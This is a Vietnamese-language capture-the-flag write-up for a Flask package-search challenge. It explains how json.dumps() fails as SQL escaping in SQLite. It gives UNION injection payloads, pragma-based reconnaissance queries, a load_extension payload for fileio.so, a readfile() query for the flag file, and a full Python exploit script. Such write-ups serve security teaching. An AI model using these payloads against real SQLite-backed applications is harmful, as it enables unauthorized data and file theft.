# Packages

## Challenge Description

```
Một ứng dụng Flask cho phép tìm kiếm packages trên các distro Linux khác nhau.
Ứng dụng sử dụng SQLite database và có chức năng tìm kiếm theo distro và package name.
```

**Files provided:**

- Source code Flask application
- Dockerfile
- SQLite database

**Challenge URL:** `http://challenge.ctf.com:port`

---

## Difficulty Assessment

### Overall Difficulty: Medium

**Breakdown:**

- **Technical Complexity:** ⭐⭐⭐☆☆
- **Research Required:** ⭐⭐⭐⭐☆
- **Time Consumption:** ⭐⭐⭐☆☆
- **Guessing Factor:** ⭐⭐☆☆☆

**Why this difficulty?**
Bài này yêu cầu hiểu sâu về SQLite, SQLite extensions, và persistent database connections. Điểm khó nhất là nhận ra rằng `json.dumps()` không phải là proper SQL escaping và exploit qua SQLite extensions để đọc file.

---

## Topics & Techniques

### Primary Topic

- **SQL Injection** - UNION-based SQLi trong SQLite database

### Sub-topics & Skills Required

- [x] **SQLite-specific syntax** - Hiểu cách SQLite xử lý string literals với dấu ngoặc kép
- [x] **SQLite Extensions** - Load và sử dụng SQLite extensions (fileio.so)
- [x] **Database Reconnaissance** - Sử dụng pragma functions để enumerate
- [x] **Python sqlite3 module** - Hiểu về persistent connections
- [x] **Flask security** - Phân tích lỗ hổng trong Flask applications

---

## Tools Used

### Essential Tools

```bash
# Browser để test SQLi payloads
curl "http://target/?package=test"

# URL encoding cho complex payloads
python -c "from urllib.parse import quote; print(quote('payload'))"
```

### Tools List

| Tool         | Purpose                        | Installation |
| ------------ | ------------------------------ | ------------ |
| Browser/cURL | Testing SQL injection payloads | Built-in     |
| Python       | URL encoding và testing        | Built-in     |

---

## Useful Resources

### Documentation & References

- [SQLite Official Documentation](https://www.sqlite.org/docs.html) - SQLite syntax và features
- [SQLite Loadable Extensions](https://www.sqlite.org/loadext.html) - Extensions system
- [SQLite Pragma Statements](https://www.sqlite.org/pragma.html) - Pragma functions
- [Python sqlite3 module](https://docs.python.org/3/library/sqlite3.html) - Python SQLite API

### Learning Materials

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection) - SQL injection fundamentals
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection) - SQL injection techniques
- [PayloadsAllTheThings SQLite](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) - SQLite injection cheatsheet

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Khai thác SQL Injection thông qua việc bypass `json.dumps()` escaping (SQLite chấp nhận dấu ngoặc kép cho string literals). Load SQLite extension `fileio.so` để có function `readfile()`, sau đó đọc file `/app/flag.txt`.

---

### Step 1: Initial Analysis & Reconnaissance

**Objective:** Phân tích source code và tìm lỗ hổng

Phân tích code Flask cho thấy lỗ hổng SQL Injection:

```python
sql = "SELECT distro, distro_version, package, package_version FROM packages"
if distro or package:
    sql += " WHERE "
if distro:
    sql += f"LOWER(distro) = {json.dumps(distro)}"  # ❌ LỖ HỔNG
if distro and package:
    sql += " AND "
if package:
    sql += f"LOWER(package) = {json.dumps(package)}"  # ❌ LỖ HỔNG
```

**Observations:**

- Developer sử dụng `json.dumps()` để "escape" input thay vì parameterized queries
- `json.dumps("test")` trả về `"test"` (thêm dấu ngoặc kép)
- SQLite cho phép dùng **cả dấu ngoặc đơn `'` VÀ dấu ngoặc kép `"`** cho string literals
- Database connection là persistent: `sqlite3.connect("packages.db", check_same_thread=False)`
- Extensions được enable: `db.enable_load_extension(True)`

---

### Step 2: Confirming SQL Injection

**Objective:** Xác nhận lỗ hổng SQLi có thể exploit được

Payload test cơ bản:

```bash
GET /?package=" UNION SELECT null,null,null,null--
```

**Output:**

```
Hiển thị 1 row với các giá trị None
```

**Key findings:**

- SQL Injection confirmed
- UNION query hoạt động
- Cần 4 columns để match với original query

---

### Step 3: Database Reconnaissance

**Objective:** Thu thập thông tin về database, functions, và compile options

#### 3.1. Enumerate database schema

```sql
GET /?package=" UNION SELECT type,name,tbl_name,sql FROM sqlite_master--
```

#### 3.2. List available modules

```sql
GET /?package=" UNION SELECT name,NULL,NULL,NULL FROM pragma_module_list()--
```

Kết quả: csv, dbstat, fts3, fts4, fts5, json_tree, json_each, rtree

#### 3.3. Check compile options

```sql
GET /?package=" UNION SELECT group_concat(sqlite_compileoption_get(value),'|'),NULL,NULL,NULL
FROM (SELECT ROW_NUMBER() OVER() as value FROM packages LIMIT 100)--
```

**Key findings:**

- `ENABLE_LOAD_EXTENSION` ✅ - Có thể load extensions
- `ENABLE_FTS3`, `ENABLE_FTS4`, `ENABLE_FTS5` ✅
- `ENABLE_MATH_FUNCTIONS` ✅

#### 3.4. List all functions

```sql
GET /?package=" UNION SELECT group_concat(name,'|'),NULL,NULL,NULL FROM pragma_function_list()--
```

Kết quả:

- Có function `load_extension` ✅
- Chưa có `readfile` hoặc `writefile` ❌ - Cần load extension

---

### Step 4: Loading SQLite Extension

**Objective:** Load extension fileio.so để có function readfile()

Từ Dockerfile, biết extensions được compile tại `/sqlite/ext/misc/*.so`:

```dockerfile
WORKDIR /sqlite/ext/misc
RUN for f in *; do gcc -g -fPIC -shared $f -o "${f%.c}.so"; done
```

**Payload để load extension:**

```sql
GET /?package=" AND (load_extension('/sqlite/ext/misc/fileio.so') OR 1=1) AND ""="
```

**Lưu ý quan trọng:**

- Payload này có thể trả về lỗi 500 NHƯNG extension vẫn được load
- Database connection là persistent → extension tồn tại cho các requests tiếp theo

**Verify extension loaded:**

```sql
GET /?package=" UNION SELECT name,NULL,NULL,NULL FROM pragma_function_list() WHERE name='readfile'--
```

Kết quả: Hiển thị `readfile` → Extension loaded thành công! 🎉

---

### Step 5: Getting the Flag

**Objective:** Sử dụng readfile() để đọc flag

**Final payload:**

```bash
GET /?package=" UNION SELECT readfile('/app/flag.txt'),NULL,NULL,NULL--
```

**Flag obtained:**

```
bctf{flag_content_here}
```

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for Packages Challenge - BuckeyeCTF 2025
"""

import requests
from urllib.parse import quote

TARGET_URL = "http://challenge.ctf.com:port"

def exploit():
    # Step 1: Confirm SQLi
    print("[*] Step 1: Confirming SQL Injection...")
    payload1 = '" UNION SELECT null,null,null,null--'
    r1 = requests.get(f"{TARGET_URL}/?package={quote(payload1)}")
    if r1.status_code == 200:
        print("[+] SQLi confirmed!")

    # Step 2: Load extension (may return 500 but still works)
    print("[*] Step 2: Loading fileio extension...")
    payload2 = '" AND (load_extension(\'/sqlite/ext/misc/fileio.so\') OR 1=1) AND ""="'
    r2 = requests.get(f"{TARGET_URL}/?package={quote(payload2)}")
    print(f"[*] Load extension response: {r2.status_code}")

    # Step 3: Verify extension loaded
    print("[*] Step 3: Verifying extension loaded...")
    payload3 = '" UNION SELECT name,NULL,NULL,NULL FROM pragma_function_list() WHERE name=\'readfile\'--'
    r3 = requests.get(f"{TARGET_URL}/?package={quote(payload3)}")
    if 'readfile' in r3.text:
        print("[+] Extension loaded successfully!")

    # Step 4: Read flag
    print("[*] Step 4: Reading flag...")
    payload4 = '" UNION SELECT readfile(\'/app/flag.txt\'),NULL,NULL,NULL--'
    r4 = requests.get(f"{TARGET_URL}/?package={quote(payload4)}")

    if 'bctf{' in r4.text:
        print("[+] Flag found!")
        # Extract flag from HTML
        import re
        flag = re.search(r'bctf\{[^}]+\}', r4.text)
        if flag:
            print(f"\n[!] FLAG: {flag.group(0)}\n")
    else:
        print("[-] Flag not found in response")
        print(r4.text[:500])

if __name__ == "__main__":
    exploit()
```

</details>

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **json.dumps() ≠ SQL Escaping:** `json.dumps()` chỉ là JSON serialization, không phải proper SQL escaping. SQLite chấp nhận cả dấu `"` và `'` cho strings.

2. **Persistent Connections Matter:** Database connection với `check_same_thread=False` là persistent, cho phép multi-step attacks (load extension → sử dụng extension).

3. **SQLite Extensions System:** SQLite extensions có thể cung cấp powerful functions như `readfile()`, `writefile()`. Khi `enable_load_extension(True)`, có thể load arbitrary .so files.

4. **Systematic Reconnaissance:** Thu thập thông tin bằng pragma functions (`pragma_module_list()`, `pragma_function_list()`, `sqlite_compileoption_get()`) trước khi exploit.

### Mistakes Made

- ❌ Ban đầu nghĩ extension load fail vì response 500 → ✅ Nhận ra persistent connection giữ extension loaded
- ❌ Tìm cách bypass blacklist → ✅ SQLite không có `readfile()` built-in, phải load extension

### Tips & Tricks

- 💡 Khi thấy `json.dumps()` trong SQL query, check xem database có accept dấu `"` cho strings không
- 💡 Luôn enumerate compile options và available functions trong SQLi
- 💡 Persistent connections có thể khai thác qua multi-step attacks
- 💡 Đọc Dockerfile để tìm paths và hiểu environment
